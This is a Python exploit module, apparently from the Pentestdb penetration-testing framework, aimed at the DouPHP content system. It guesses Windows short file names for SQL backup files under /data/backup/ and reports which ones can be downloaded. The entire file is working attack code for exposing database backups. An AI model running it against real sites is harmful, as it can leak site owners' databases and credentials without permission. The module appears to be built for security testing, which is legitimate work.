#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2014-2015 alpha1e0
'''

import datetime

from script.exploit import Exploit, Result


class DouPHPFD(Exploit):
    expName = u"DouPHP 备份文件短文件名爆破"
    version = "1.0"
    author = "alpha1e0"
    language = "php"
    appName = "DouPHP"
    reference = ['aa']
    description = u'''
        漏洞利用条件：windows系统且没有关闭短文件名功能
    '''


    def _verify(self):
        result = Result()

        sqlList = ['D20160~1.sql','D20150~1.sql','D20151~1.sql','D20140~1.sql','D20141~1.sql','D20131~1.sql']

        vulURLs = []
        for sqlfile in sqlList:
            url = self.host + "/data/backup/" + sqlfile

            try:
                #print "debug>>: getting '{0}'".format(url)
                r = self.http.get(url,allow_redirects=False)
            except http.ConnectionError:
                pass
            else:
                if r.status_code == 200:
                    #print "++++++++++++++++++++++++++++++++++++++++++++++++ got alive\n'{0}'".format(url)
                    vulURLs.append(url)

        if vulURLs:
            result['Else'] = {}
            result['Else']['Target'] = self.url
            result['Else']['Info'] = str(vulURLs)

        return result


    def _attack(self):
        return self.verify()